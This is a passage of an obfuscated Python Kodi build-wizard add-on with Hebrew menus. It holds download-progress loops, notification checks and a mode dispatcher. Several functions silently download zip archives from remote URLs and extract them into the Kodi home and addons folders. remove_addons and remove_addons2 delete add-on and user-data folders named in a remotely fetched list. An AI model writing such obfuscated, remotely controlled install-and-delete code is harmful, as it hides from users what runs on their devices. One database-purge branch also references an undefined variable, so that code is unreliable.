				OOOOOOOOOO000O0O0 =O0OO00000O0OO0O00 .replace ('\\','/').split ('/')#line:5075
				OOOO0OOO0O000OO0O .append ('(%s) %s'%(OOOOOOOOOO000O0O0 [len (OOOOOOOOOO000O0O0 )-2 ],OOOOOOOOOO000O0O0 [len (OOOOOOOOOO000O0O0 )-1 ]))#line:5076
	if KODIV >=16 :#line:5077
		O0OOO0000O00O0O00 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOOO0OOO0O000OO0O )#line:5078
		if O0OOO0000O00O0O00 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5079
		elif len (O0OOO0000O00O0O00 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5080
		else :#line:5081
			for O00O0OO0OOO0OO000 in O0OOO0000O00O0O00 :wiz .purgeDb (O0O0O0O0OOOO0OO00 [O00O0OO0OOO0OO000 ])#line:5082
	else :#line:5083
		O0OOO0000O00O0O00 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOOO0OOO0O000OO0O )#line:5084
		if O0OOO0000O00O0O00 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5085
		else :wiz .purgeDb (O0O0O0O0OOOO0OO00 [O00O0OO0OOO0OO000 ])#line:5086
def fastupdatefirstbuild (OOO0O00OO00O0OOO0 ):#line:5092
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5094
	if ENABLE =='Yes':#line:5095
		if not NOTIFY =='true':#line:5096
			OO00000000O0O0O00 =wiz .workingURL (NOTIFICATION )#line:5097
			if OO00000000O0O0O00 ==True :#line:5098
				OOO0O0000OOO0OOOO ,O0OOO0O0O00OOO0O0 =wiz .splitNotify (NOTIFICATION )#line:5099
				if not OOO0O0000OOO0OOOO ==False :#line:5101
					try :#line:5102
						OOO0O0000OOO0OOOO =int (OOO0O0000OOO0OOOO );OOO0O00OO00O0OOO0 =int (OOO0O00OO00O0OOO0 )#line:5103
						checkidupdate ()#line:5104
						wiz .setS ("notedismiss","true")#line:5105
						if OOO0O0000OOO0OOOO ==OOO0O00OO00O0OOO0 :#line:5106
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOO0O0000OOO0OOOO ),xbmc .LOGNOTICE )#line:5107
						elif OOO0O0000OOO0OOOO >OOO0O00OO00O0OOO0 :#line:5109
							wiz .log ("[Notifications] id: %s"%str (OOO0O0000OOO0OOOO ),xbmc .LOGNOTICE )#line:5110
							wiz .setS ('noteid',str (OOO0O0000OOO0OOOO ))#line:5111
							wiz .setS ("notedismiss","true")#line:5112
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5115
					except Exception as O000000O0OOOO00OO :#line:5116
						wiz .log ("Error on Notifications Window: %s"%str (O000000O0OOOO00OO ),xbmc .LOGERROR )#line:5117
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5119
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO00000000O0O0O00 ),xbmc .LOGNOTICE )#line:5120
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5121
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5122
def checkidupdate ():#line:5128
				wiz .setS ("notedismiss","true")#line:5130
				OO0OO0OOOO000OOO0 =wiz .workingURL (NOTIFICATION )#line:5131
				O0O0O00O0O0O0OO0O =" Kodi Premium"#line:5133
				OOO000O0OOOO0OOO0 =wiz .checkBuild (O0O0O00O0O0O0OO0O ,'gui')#line:5134
				O0OO0O00OOO0O000O =O0O0O00O0O0O0OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5135
				if not wiz .workingURL (OOO000O0OOOO0OOO0 )==True :return #line:5136
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5137
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0O0O00O0O0O0OO0O ),'','אנא המתן')#line:5138
				OOOO0O0O00OOO000O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO0O00OOO0O000O )#line:5139
				try :os .remove (OOOO0O0O00OOO000O )#line:5140
				except :pass #line:5141
				logging .warning (OOO000O0OOOO0OOO0 )#line:5142
				if 'google'in OOO000O0OOOO0OOO0 :#line:5143
				   O0O0O0000OO00O000 =googledrive_download (OOO000O0OOOO0OOO0 ,OOOO0O0O00OOO000O ,DP ,wiz .checkBuild (O0O0O00O0O0O0OO0O ,'filesize'))#line:5144
				else :#line:5147
				  downloader .download (OOO000O0OOOO0OOO0 ,OOOO0O0O00OOO000O ,DP )#line:5148
				xbmc .sleep (100 )#line:5149
				OOO0O00000O000000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O00O0O0O0OO0O )#line:5150
				DP .update (0 ,OOO0O00000O000000 ,'','אנא המתן')#line:5151
				extract .all (OOOO0O0O00OOO000O ,HOME ,DP ,title =OOO0O00000O000000 )#line:5152
				DP .close ()#line:5153
				wiz .defaultSkin ()#line:5154
				wiz .lookandFeelData ('save')#line:5155
				if KODIV >=18 :#line:5156
					skindialogsettind18 ()#line:5157
				wiz .kodi17Fix ()#line:5158
				if INSTALLMETHOD ==1 :O00OOOOOOO0O00000 =1 #line:5160
				elif INSTALLMETHOD ==2 :O00OOOOOOO0O00000 =0 #line:5161
				else :DP .close ()#line:5162
def gaiaserenaddon ():#line:5164
  OO00O00OOOO000OOO =(ADDON .getSetting ("gaiaseren"))#line:5165
  OOOOOO0O0OO0OOOO0 =(ADDON .getSetting ("auto_rd"))#line:5166
  if OO00O00OOOO000OOO =='true'and OOOOOO0O0OO0OOOO0 =='true':#line:5167
    OO000000O0O0OOOOO =(NEWFASTUPDATE )#line:5168
    O0O0O0O0OO00OO0O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5169
    O0OOO000O00OO00O0 =xbmcgui .DialogProgress ()#line:5170
    O0OOO000O00OO00O0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5171
    OOOOO0O00000O0O00 =os .path .join (PACKAGES ,'isr.zip')#line:5172
    OO0OO0O0OO0O0O0OO =urllib2 .Request (OO000000O0O0OOOOO )#line:5173
    O000OO0O000O0OOO0 =urllib2 .urlopen (OO0OO0O0OO0O0O0OO )#line:5174
    O0O00O000000O0OO0 =xbmcgui .DialogProgress ()#line:5176
    O0O00O000000O0OO0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5177
    O0O00O000000O0OO0 .update (0 )#line:5178
    O000000O00O00O000 =open (OOOOO0O00000O0O00 ,'wb')#line:5180
    try :#line:5182
      O000O0O0O0OOOOOO0 =O000OO0O000O0OOO0 .info ().getheader ('Content-Length').strip ()#line:5183
      O0O00OO0OO0O0O00O =True #line:5184
    except AttributeError :#line:5185
          O0O00OO0OO0O0O00O =False #line:5186
    if O0O00OO0OO0O0O00O :#line:5188
          O000O0O0O0OOOOOO0 =int (O000O0O0O0OOOOOO0 )#line:5189
    OOO0OO0O0OO000OO0 =0 #line:5191
    O000OOOO0O00OOO00 =time .time ()#line:5192
    while True :#line:5193
          OO0O0OOOO00OO0O0O =O000OO0O000O0OOO0 .read (8192 )#line:5194
          if not OO0O0OOOO00OO0O0O :#line:5195
              sys .stdout .write ('\n')#line:5196
              break #line:5197
          OOO0OO0O0OO000OO0 +=len (OO0O0OOOO00OO0O0O )#line:5199
          O000000O00O00O000 .write (OO0O0OOOO00OO0O0O )#line:5200
          if not O0O00OO0OO0O0O00O :#line:5202
              O000O0O0O0OOOOOO0 =OOO0OO0O0OO000OO0 #line:5203
          if O0O00O000000O0OO0 .iscanceled ():#line:5204
             O0O00O000000O0OO0 .close ()#line:5205
             try :#line:5206
              os .remove (OOOOO0O00000O0O00 )#line:5207
             except :#line:5208
              pass #line:5209
             break #line:5210
          O00OOO0O00O0OO0O0 =float (OOO0OO0O0OO000OO0 )/O000O0O0O0OOOOOO0 #line:5211
          O00OOO0O00O0OO0O0 =round (O00OOO0O00O0OO0O0 *100 ,2 )#line:5212
          O00O0O0OO00O0OOOO =OOO0OO0O0OO000OO0 /(1024 *1024 )#line:5213
          OOOOO0000O0OOO000 =O000O0O0O0OOOOOO0 /(1024 *1024 )#line:5214
          OOOO0O0OO0O000OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00O0O0OO00O0OOOO ,'teal',OOOOO0000O0OOO000 )#line:5215
          if (time .time ()-O000OOOO0O00OOO00 )>0 :#line:5216
            O0OO00O0OOO0000OO =OOO0OO0O0OO000OO0 /(time .time ()-O000OOOO0O00OOO00 )#line:5217
            O0OO00O0OOO0000OO =O0OO00O0OOO0000OO /1024 #line:5218
          else :#line:5219
           O0OO00O0OOO0000OO =0 #line:5220
          OO0OOO000OOO000O0 ='KB'#line:5221
          if O0OO00O0OOO0000OO >=1024 :#line:5222
             O0OO00O0OOO0000OO =O0OO00O0OOO0000OO /1024 #line:5223
             OO0OOO000OOO000O0 ='MB'#line:5224
          if O0OO00O0OOO0000OO >0 and not O00OOO0O00O0OO0O0 ==100 :#line:5225
              O0000OO0O0000O0OO =(O000O0O0O0OOOOOO0 -OOO0OO0O0OO000OO0 )/O0OO00O0OOO0000OO #line:5226
          else :#line:5227
              O0000OO0O0000O0OO =0 #line:5228
          O0O0OOO000000OOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO00O0OOO0000OO ,OO0OOO000OOO000O0 )#line:5229
          O0O00O000000O0OO0 .update (int (O00OOO0O00O0OO0O0 ),OOOO0O0OO0O000OOO ,O0O0OOO000000OOO0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5231
    O00O0OOO0OOOO0OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5234
    O000000O00O00O000 .close ()#line:5237
    extract .all (OOOOO0O00000O0O00 ,O00O0OOO0OOOO0OOO ,O0O00O000000O0OO0 )#line:5238
    try :#line:5242
      os .remove (OOOOO0O00000O0O00 )#line:5243
    except :#line:5244
      pass #line:5245
def iptvsimpldown ():#line:5246
    OOOO00OO0000O0OOO =(IPTVSIMPL18 )#line:5248
    O0OOOOOO0O00OO0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5249
    O0O0O0OOOO00OOO00 =xbmcgui .DialogProgress ()#line:5250
    O0O0O0OOOO00OOO00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5251
    O00OO0OO00OOOOOOO =os .path .join (PACKAGES ,'isr.zip')#line:5252
    OO0O000000OO00O0O =urllib2 .Request (OOOO00OO0000O0OOO )#line:5253
    O0OOO0OO00OOOO0OO =urllib2 .urlopen (OO0O000000OO00O0O )#line:5254
    OOO000OOO00000OOO =xbmcgui .DialogProgress ()#line:5256
    OOO000OOO00000OOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5257
    OOO000OOO00000OOO .update (0 )#line:5258
    O0000000000O000OO =open (O00OO0OO00OOOOOOO ,'wb')#line:5260
    try :#line:5262
      OOOOOO0O000000000 =O0OOO0OO00OOOO0OO .info ().getheader ('Content-Length').strip ()#line:5263
      OOO0000OOO0O0OOO0 =True #line:5264
    except AttributeError :#line:5265
          OOO0000OOO0O0OOO0 =False #line:5266
    if OOO0000OOO0O0OOO0 :#line:5268
          OOOOOO0O000000000 =int (OOOOOO0O000000000 )#line:5269
    OOOO0OOO0OO00O0O0 =0 #line:5271
    O0O000O0000OO0O0O =time .time ()#line:5272
    while True :#line:5273
          O00O00OOO0OOO0O00 =O0OOO0OO00OOOO0OO .read (8192 )#line:5274
          if not O00O00OOO0OOO0O00 :#line:5275
              sys .stdout .write ('\n')#line:5276
              break #line:5277
          OOOO0OOO0OO00O0O0 +=len (O00O00OOO0OOO0O00 )#line:5279
          O0000000000O000OO .write (O00O00OOO0OOO0O00 )#line:5280
          if not OOO0000OOO0O0OOO0 :#line:5282
              OOOOOO0O000000000 =OOOO0OOO0OO00O0O0 #line:5283
          if OOO000OOO00000OOO .iscanceled ():#line:5284
             OOO000OOO00000OOO .close ()#line:5285
             try :#line:5286
              os .remove (O00OO0OO00OOOOOOO )#line:5287
             except :#line:5288
              pass #line:5289
             break #line:5290
          OOOOO00OO0OOOO00O =float (OOOO0OOO0OO00O0O0 )/OOOOOO0O000000000 #line:5291
          OOOOO00OO0OOOO00O =round (OOOOO00OO0OOOO00O *100 ,2 )#line:5292
          O000OO00O0O00OO00 =OOOO0OOO0OO00O0O0 /(1024 *1024 )#line:5293
          O00OO0OOOOO0O0O0O =OOOOOO0O000000000 /(1024 *1024 )#line:5294
          OO00O0O0O00O0OO00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000OO00O0O00OO00 ,'teal',O00OO0OOOOO0O0O0O )#line:5295
          if (time .time ()-O0O000O0000OO0O0O )>0 :#line:5296
            OO0O00OOOOOO0O0O0 =OOOO0OOO0OO00O0O0 /(time .time ()-O0O000O0000OO0O0O )#line:5297
            OO0O00OOOOOO0O0O0 =OO0O00OOOOOO0O0O0 /1024 #line:5298
          else :#line:5299
           OO0O00OOOOOO0O0O0 =0 #line:5300
          O0O0O0OOO0O0OO0O0 ='KB'#line:5301
          if OO0O00OOOOOO0O0O0 >=1024 :#line:5302
             OO0O00OOOOOO0O0O0 =OO0O00OOOOOO0O0O0 /1024 #line:5303
             O0O0O0OOO0O0OO0O0 ='MB'#line:5304
          if OO0O00OOOOOO0O0O0 >0 and not OOOOO00OO0OOOO00O ==100 :#line:5305
              O00OO0000OOO00OO0 =(OOOOOO0O000000000 -OOOO0OOO0OO00O0O0 )/OO0O00OOOOOO0O0O0 #line:5306
          else :#line:5307
              O00OO0000OOO00OO0 =0 #line:5308
          OO000OOO0OOOOO0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O00OOOOOO0O0O0 ,O0O0O0OOO0O0OO0O0 )#line:5309
          OOO000OOO00000OOO .update (int (OOOOO00OO0OOOO00O ),OO00O0O0O00O0OO00 ,OO000OOO0OOOOO0OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5311
    O0OOO00000O000000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5314
    O0000000000O000OO .close ()#line:5317
    extract .all (O00OO0OO00OOOOOOO ,O0OOO00000O000000 ,OOO000OOO00000OOO )#line:5318
    try :#line:5322
      os .remove (O00OO0OO00OOOOOOO )#line:5323
    except :#line:5324
      pass #line:5325
def testnotify ():#line:5326
	O0OOO000OO000OOO0 =wiz .workingURL (NOTIFICATION )#line:5327
	if O0OOO000OO000OOO0 ==True :#line:5328
		try :#line:5329
			OOOOO0O0O0OO0OOO0 ,OOOO0OO0O00OOO0O0 =wiz .splitNotify (NOTIFICATION )#line:5330
			if OOOOO0O0O0OO0OOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5331
			if STARTP2 ()=='ok':#line:5332
				notify .notification (OOOO0OO0O00OOO0O0 ,True )#line:5333
		except Exception as O0OO000O0O000O000 :#line:5334
			wiz .log ("Error on Notifications Window: %s"%str (O0OO000O0O000O000 ),xbmc .LOGERROR )#line:5335
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5336
def testnotify2 ():#line:5337
	OOOO00O00O0OOO000 =wiz .workingURL (NOTIFICATION2 )#line:5338
	if OOOO00O00O0OOO000 ==True :#line:5339
		try :#line:5340
			OOO000OO0O00OOO00 ,OO000OOO0000OO0OO =wiz .splitNotify (NOTIFICATION2 )#line:5341
			if OOO000OO0O00OOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5342
			if STARTP2 ()=='ok':#line:5343
				notify .notification2 (OO000OOO0000OO0OO ,True )#line:5344
		except Exception as O000OO00O0O0000OO :#line:5345
			wiz .log ("Error on Notifications Window: %s"%str (O000OO00O0O0000OO ),xbmc .LOGERROR )#line:5346
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5347
def testnotify3 ():#line:5348
	OO00O0OOO0O0O0OOO =wiz .workingURL (NOTIFICATION3 )#line:5349
	if OO00O0OOO0O0O0OOO ==True :#line:5350
		try :#line:5351
			O000000OOO0O0O00O ,O0O000O0OOOOOO00O =wiz .splitNotify (NOTIFICATION3 )#line:5352
			if O000000OOO0O0O00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5353
			if STARTP2 ()=='ok':#line:5354
				notify .notification3 (O0O000O0OOOOOO00O ,True )#line:5355
		except Exception as O00O00OOO00000000 :#line:5356
			wiz .log ("Error on Notifications Window: %s"%str (O00O00OOO00000000 ),xbmc .LOGERROR )#line:5357
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5358
def servicemanual ():#line:5359
	O00O0O0O0OO0OOO00 =wiz .workingURL (HELPINFO )#line:5360
	if O00O0O0O0OO0OOO00 ==True :#line:5361
		try :#line:5362
			OOOO000OO0O00O0O0 ,O00O0OOOOO000OOO0 =wiz .splitNotify (HELPINFO )#line:5363
			if OOOO000OO0O00O0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5364
			notify .helpinfo (O00O0OOOOO000OOO0 ,True )#line:5365
		except Exception as OOO000OOOOO0000OO :#line:5366
			wiz .log ("Error on Notifications Window: %s"%str (OOO000OOOOO0000OO ),xbmc .LOGERROR )#line:5367
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5368
def testupdate ():#line:5370
	if BUILDNAME =="":#line:5371
		notify .updateWindow ()#line:5372
	else :#line:5373
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5374
def testfirst ():#line:5376
	notify .firstRun ()#line:5377
def testfirstRun ():#line:5379
	notify .firstRunSettings ()#line:5380
def fastinstall ():#line:5383
	notify .firstRuninstall ()#line:5384
def addDir (OO000O000O0O0O000 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5391
	O00O0O00OOO0OOO00 =sys .argv [0 ]#line:5392
	if not mode ==None :O00O0O00OOO0OOO00 +="?mode=%s"%urllib .quote_plus (mode )#line:5393
	if not name ==None :O00O0O00OOO0OOO00 +="&name="+urllib .quote_plus (name )#line:5394
	if not url ==None :O00O0O00OOO0OOO00 +="&url="+urllib .quote_plus (url )#line:5395
	OO000O000O0000OOO =True #line:5396
	if themeit :OO000O000O0O0O000 =themeit %OO000O000O0O0O000 #line:5397
	OOOOO00O0O0O0OO0O =xbmcgui .ListItem (OO000O000O0O0O000 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5398
	OOOOO00O0O0O0OO0O .setInfo (type ="Video",infoLabels ={"Title":OO000O000O0O0O000 ,"Plot":description })#line:5399
	OOOOO00O0O0O0OO0O .setProperty ("Fanart_Image",fanart )#line:5400
	if not menu ==None :OOOOO00O0O0O0OO0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5401
	OO000O000O0000OOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00O0O00OOO0OOO00 ,listitem =OOOOO00O0O0O0OO0O ,isFolder =True )#line:5402
	return OO000O000O0000OOO #line:5403
def addFile (O0O00O000OO0000O0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5405
	OO0OOOO0O0O00OOOO =sys .argv [0 ]#line:5406
	if not mode ==None :OO0OOOO0O0O00OOOO +="?mode=%s"%urllib .quote_plus (mode )#line:5407
	if not name ==None :OO0OOOO0O0O00OOOO +="&name="+urllib .quote_plus (name )#line:5408
	if not url ==None :OO0OOOO0O0O00OOOO +="&url="+urllib .quote_plus (url )#line:5409
	O0OO000000OOO00O0 =True #line:5410
	if themeit :O0O00O000OO0000O0 =themeit %O0O00O000OO0000O0 #line:5411
	OOOO0O000O0O000OO =xbmcgui .ListItem (O0O00O000OO0000O0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5412
	OOOO0O000O0O000OO .setInfo (type ="Video",infoLabels ={"Title":O0O00O000OO0000O0 ,"Plot":description })#line:5413
	OOOO0O000O0O000OO .setProperty ("Fanart_Image",fanart )#line:5414
	if not menu ==None :OOOO0O000O0O000OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5415
	O0OO000000OOO00O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0OOOO0O0O00OOOO ,listitem =OOOO0O000O0O000OO ,isFolder =False )#line:5416
	return O0OO000000OOO00O0 #line:5417
def get_params ():#line:5419
	O0000O00OOOOO0O0O =[]#line:5420
	O00OOO0O0O000OO00 =sys .argv [2 ]#line:5421
	if len (O00OOO0O0O000OO00 )>=2 :#line:5422
		O0O00OOO00O0O0OOO =sys .argv [2 ]#line:5423
		OOO0OOO00O0O0O0O0 =O0O00OOO00O0O0OOO .replace ('?','')#line:5424
		if (O0O00OOO00O0O0OOO [len (O0O00OOO00O0O0OOO )-1 ]=='/'):#line:5425
			O0O00OOO00O0O0OOO =O0O00OOO00O0O0OOO [0 :len (O0O00OOO00O0O0OOO )-2 ]#line:5426
		O00OO0OOOOOO00O00 =OOO0OOO00O0O0O0O0 .split ('&')#line:5427
		O0000O00OOOOO0O0O ={}#line:5428
		for O0OOO0O0OO0O00OO0 in range (len (O00OO0OOOOOO00O00 )):#line:5429
			OO0O00000O00OO00O ={}#line:5430
			OO0O00000O00OO00O =O00OO0OOOOOO00O00 [O0OOO0O0OO0O00OO0 ].split ('=')#line:5431
			if (len (OO0O00000O00OO00O ))==2 :#line:5432
				O0000O00OOOOO0O0O [OO0O00000O00OO00O [0 ]]=OO0O00000O00OO00O [1 ]#line:5433
		return O0000O00OOOOO0O0O #line:5435
def remove_addons ():#line:5437
	try :#line:5438
			import json #line:5439
			O000O0000O0OO00OO =urllib2 .urlopen (remove_url ).readlines ()#line:5440
			for O0O0OOO000O0O00OO in O000O0000O0OO00OO :#line:5441
				OO00OO000O00OOOO0 =O0O0OOO000O0O00OO .split (':')[1 ].strip ()#line:5443
				O0O0O0O0O000O0O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OO00OO000O00OOOO0 ,'false')#line:5444
				OOOOO00O00O0000OO =xbmc .executeJSONRPC (O0O0O0O0O000O0O00 )#line:5445
				OOOO00OO00OOO0O0O =json .loads (OOOOO00O00O0000OO )#line:5446
				O000OOOOOOO000000 =os .path .join (addons_folder ,OO00OO000O00OOOO0 )#line:5448
				if os .path .exists (O000OOOOOOO000000 ):#line:5450
					for O0000OO0O000O0000 ,O00OOO0OOOO00000O ,OOO00OO0O0O0OO0O0 in os .walk (O000OOOOOOO000000 ):#line:5451
						for OO00000O0OO0OO00O in OOO00OO0O0O0OO0O0 :#line:5452
							os .unlink (os .path .join (O0000OO0O000O0000 ,OO00000O0OO0OO00O ))#line:5453
						for O00000OOO0OOOOOO0 in O00OOO0OOOO00000O :#line:5454
							shutil .rmtree (os .path .join (O0000OO0O000O0000 ,O00000OOO0OOOOOO0 ))#line:5455
					os .rmdir (O000OOOOOOO000000 )#line:5456
			xbmc .executebuiltin ('Container.Refresh')#line:5458
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5459
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5460
	except :pass #line:5461
def remove_addons2 ():#line:5462
	try :#line:5463
			import json #line:5464
			OO00OOO0OOOOO0OO0 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5465
			for O00OO0000O0OO0OOO in OO00OOO0OOOOO0OO0 :#line:5466
				OO0OOOOOO00000OO0 =O00OO0000O0OO0OOO .split (':')[1 ].strip ()#line:5468
				O0O0OOOO0O0000O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OO0OOOOOO00000OO0 ,'false')#line:5469
				OOO00OO0OOOO0O0OO =xbmc .executeJSONRPC (O0O0OOOO0O0000O0O )#line:5470
				OO0000000OOO000O0 =json .loads (OOO00OO0OOOO0O0OO )#line:5471
				O000OOO0OO0OO0000 =os .path .join (user_folder ,OO0OOOOOO00000OO0 )#line:5473
				if os .path .exists (O000OOO0OO0OO0000 ):#line:5475
					for OOOOO0O00OO0OOOO0 ,O000O00OOO0000O0O ,OOO0O0O0O0O0OOO0O in os .walk (O000OOO0OO0OO0000 ):#line:5476
						for O0O0000O0O0OO0000 in OOO0O0O0O0O0OOO0O :#line:5477
							os .unlink (os .path .join (OOOOO0O00OO0OOOO0 ,O0O0000O0O0OO0000 ))#line:5478
						for O00O0OOO00OO0000O in O000O00OOO0000O0O :#line:5479
							shutil .rmtree (os .path .join (OOOOO0O00OO0OOOO0 ,O00O0OOO00OO0000O ))#line:5480
					os .rmdir (O000OOO0OO0OO0000 )#line:5481
	except :pass #line:5483
params =get_params ()#line:5484
url =None #line:5485
name =None #line:5486
mode =None #line:5487
try :mode =urllib .unquote_plus (params ["mode"])#line:5489
except :pass #line:5490
try :name =urllib .unquote_plus (params ["name"])#line:5491
except :pass #line:5492
try :url =urllib .unquote_plus (params ["url"])#line:5493
except :pass #line:5494
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5496
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5497
def setView (O0OOOOO0000O0O0O0 ,OOOO0O0O00OO00O0O ):#line:5498
	if wiz .getS ('auto-view')=='true':#line:5499
		OO00OOOO0O0OO000O =wiz .getS (OOOO0O0O00OO00O0O )#line:5500
		if OO00OOOO0O0OO000O =='50'and KODIV >=17 and SKIN =='skin.estuary':OO00OOOO0O0OO000O ='55'#line:5501
		if OO00OOOO0O0OO000O =='500'and KODIV >=17 and SKIN =='skin.estuary':OO00OOOO0O0OO000O ='50'#line:5502
		wiz .ebi ("Container.SetViewMode(%s)"%OO00OOOO0O0OO000O )#line:5503
if mode ==None :index ()#line:5505
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5507
elif mode =='builds':buildMenu ()#line:5508
elif mode =='viewbuild':viewBuild (name )#line:5509
elif mode =='buildinfo':buildInfo (name )#line:5510
elif mode =='buildpreview':buildVideo (name )#line:5511
elif mode =='install':buildWizard (name ,url )#line:5512
elif mode =='theme':buildWizard (name ,mode ,url )#line:5513
elif mode =='viewthirdparty':viewThirdList (name )#line:5514
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5515
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5516
elif mode =='maint':maintMenu (name )#line:5518
elif mode =='passpin':passandpin ()#line:5519
elif mode =='backmyupbuild':backmyupbuild ()#line:5520
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5521
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5522
elif mode =='advancedsetting':advancedWindow (name )#line:5523
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5524
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5525
elif mode =='asciicheck':wiz .asciiCheck ()#line:5526
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5527
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5528
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5529
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5530
